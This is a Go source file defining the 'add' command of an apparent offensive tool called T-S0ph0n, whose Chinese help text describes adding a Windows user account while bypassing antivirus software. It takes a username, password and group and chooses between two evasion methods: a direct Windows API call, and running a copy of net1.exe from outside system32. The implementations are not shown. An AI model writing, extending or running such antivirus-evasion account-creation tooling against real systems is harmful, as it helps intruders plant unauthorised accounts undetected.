package cmd

import (
	"T-S0ph0n/pkg"
	"fmt"
	"github.com/spf13/cobra"
	"os"
)

var (
	add = &cobra.Command{
		Use:   "add",
		Short: "绕过反病毒软件添加指定用户",
		Run:   antiAv,
	}
	avtag     uint8
	userName  string
	pwd       string
	groupName string
)

func init() {
	add.Flags().Uint8Var(&avtag, "t", 0, "绕过方式")
	add.Flags().StringVarP(&userName, "user", "u", "", "指定用户名")
	add.Flags().StringVarP(&pwd, "pwd", "p", "", "指定密码")
	add.Flags().StringVarP(&groupName, "group", "g", "", "指定组")
}

func antiAv(cmd *cobra.Command, args []string) {
	hello()
	if userName == "" || pwd == "" {
		fmt.Println("请指定用户名及密码!")
		os.Exit(500)
	}
	switch avtag {
	case 1: //绕过方式1(调用WindowsAPI)
		pkg.AntiNumber(userName, pwd, groupName)
	case 2: //绕过方式2(复制net1.exe文件到除system32路径以外的其它目录进行执行)
		pkg.AntiTinder(userName, pwd, groupName)
	default:
		fmt.Println("暂不支持你指定的反病毒软件!")
	}
}
